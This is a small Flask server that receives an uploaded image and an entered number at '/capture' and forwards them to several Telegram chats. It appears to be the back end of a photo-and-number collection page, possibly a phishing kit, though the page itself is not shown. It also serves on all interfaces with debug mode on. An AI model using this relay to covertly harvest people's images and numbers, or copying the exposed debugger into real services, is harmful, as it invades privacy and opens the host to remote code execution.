from flask import Flask, render_template, request, jsonify
import os
from io import BytesIO
import telebot
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# Retrieve the BOT_TOKEN and CHAT_IDS from environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_IDS = os.getenv('CHAT_IDS').split(',')  # Split the comma-separated string into a list

# Initialize the telebot
bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    # Get the image and name from the POST request
    img_file = request.files['image']
    user_name = request.form['name']  # Get the name from the form

    # Send the image and name to all Telegram chat IDs
    send_to_telegram(img_file, user_name)

    return jsonify({"message": "successfull!"})

def send_to_telegram(image_file, name):
    # Read image as binary
    image_bytes = image_file.read()

    # Create a caption with the user's name
    caption = f"Entered Number: {name}"

    # Send the image to all chat IDs
    for chat_id in CHAT_IDS:
        try:
            bot.send_photo(chat_id=chat_id, photo=BytesIO(image_bytes), caption=caption)
        except Exception as e:
            print(f"Error while sumbit {chat_id}: {e}")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)

